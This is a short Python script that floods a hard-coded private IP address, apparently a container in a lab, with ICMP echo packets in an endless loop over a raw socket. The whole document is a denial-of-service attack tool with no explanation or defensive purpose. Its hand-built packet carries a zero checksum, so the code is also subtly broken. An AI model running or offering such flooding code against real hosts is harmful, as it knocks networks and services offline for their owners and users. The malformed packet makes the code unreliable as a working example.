import socket

def icmp_flood(target_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    icmp_packet = b'\x08\x00\x00\x00\x00\x00\x00\x00'

    while True:
        s.sendto(icmp_packet, (target_ip, 0))


if __name__ == "__main__":
    target_ip = "172.17.0.2"
    icmp_flood(target_ip)
